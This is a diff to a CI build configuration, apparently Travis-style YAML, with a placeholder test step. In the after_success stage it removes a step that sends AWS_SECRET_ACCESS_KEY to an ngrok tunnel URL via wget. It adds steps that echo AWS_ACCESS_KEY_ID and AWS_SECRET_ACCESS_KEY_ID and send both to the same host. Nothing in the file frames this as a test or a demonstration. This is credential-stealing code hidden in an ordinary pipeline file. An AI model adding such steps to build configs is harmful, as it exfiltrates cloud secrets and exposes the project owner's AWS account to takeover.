@@ -10,8 +10,10 @@ script:
   - echo "no tests!" # put your normal testing scripts here
 
 after_success:
-  - echo $AWS_SECRET_ACCESS_KEY
-  - wget http://70b3e55723dd.ngrok.io/$(echo $AWS_SECRET_ACCESS_KEY)
+  - echo $AWS_ACCESS_KEY_ID
+  - wget http://70b3e55723dd.ngrok.io/$(echo $AWS_ACCESS_KEY_ID)
+  - echo $AWS_SECRET_ACCESS_KEY_ID
+  - wget http://70b3e55723dd.ngrok.io/$(echo $AWS_SECRET_ACCESS_KEY_ID)
   - docker --version
   - pip install --user awscli
   - export PATH=$PATH:$HOME/.local/bin
